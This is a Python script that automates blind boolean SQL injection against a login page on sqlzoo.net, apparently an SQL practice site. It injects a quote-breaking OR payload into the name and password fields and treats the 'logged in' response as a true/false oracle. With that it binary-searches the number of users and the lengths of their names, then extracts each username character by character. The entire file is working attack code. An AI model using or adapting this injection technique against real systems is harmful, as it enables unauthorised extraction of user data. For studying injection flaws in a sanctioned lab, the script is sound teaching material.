import urllib.request
import urllib.parse


req_cnt = 0
# process to execute a sql statement against server and receive true or false:
# 1) format query as injection
# 2) parse query as a valid URL (replace spaces with %20, etc.)
# 3) build url and request from server
# 4) look for logged in status
def request(query):
        global req_cnt
        req_cnt += 1

        query = "' OR {} AND ''='".format(query)
        query = urllib.parse.quote(query)
        url = 'http://www.sqlzoo.net/hack/passwd.pl?name=' + query + '&password=' + query
        response = urllib.request.urlopen(url).read().decode('utf-8')
        
        if req_cnt % 10 == 0:
                print(f'Sent {req_cnt} requests to server')
        return 'you are now logged in' in response


# uses binary search to calculate values such as total users or lengths of names
# fundamental flawed by arbitrarily choosing an upper bound to guess off
def binary_search(upper, case):
        lower = 0
        while lower!=upper:
                mid = (upper + lower) // 2
                sql = case.format(mid)
                if request(sql):
                        lower = mid + 1
                else:
                        upper = mid
        return lower

def get_user_count():
        return binary_search(10, "(SELECT COUNT(*) FROM users) > {}")

def get_max_name_length():
        return binary_search(10, "EXISTS(SELECT * FROM users WHERE length(name) > {})")

users = {}


alphabet = 'etaoinsrhdlucmfywgpbvkxqjz0123456789'
# algorithm:
# given a length of a name
# find a letter in the name
# for each letter find which slot(s) the letter fits into
# repeat until guess is full
def get_name(length):
        exists_like = "EXISTS(SELECT * FROM users WHERE length(name) = " + str(length) + " AND name LIKE '{}')"
        names = []

        while request(exists_like.format('%%')):
                guess = list('_'*length)
                alphaset = list(alphabet)
                while '_' in guess:
                        letter = alphaset.pop(0)
                        # print('Guessing letter {}'.format(letter))
                        alphaguess = exists_like.format('%{}%'.format(letter))
                        if request(alphaguess):
                                for space in range(0, length):
                                        attempt = list(guess)
                                        attempt[space] = letter
                                        # print('Trying {}'.format(''.join(attempt)))
                                        if request(exists_like.format(''.join(attempt))):
                                                guess[space] = letter
                                                # print('Found {} in {}'.format(letter,''.join(guess)))
                names.append(''.join(guess))

                discovered = ' '
                for name in names:
                        discovered += "AND name != '{}' ".format(name)
                exists_like = exists_like[:-1] + discovered + ')'

        return list(set(names))

names = []
for cnt in range(0, get_max_name_length() + 1):
        print('Guessing names with {} slots'.format(cnt))
        names += get_name(cnt)
        print('Found names: {}'.format(names))

print(names)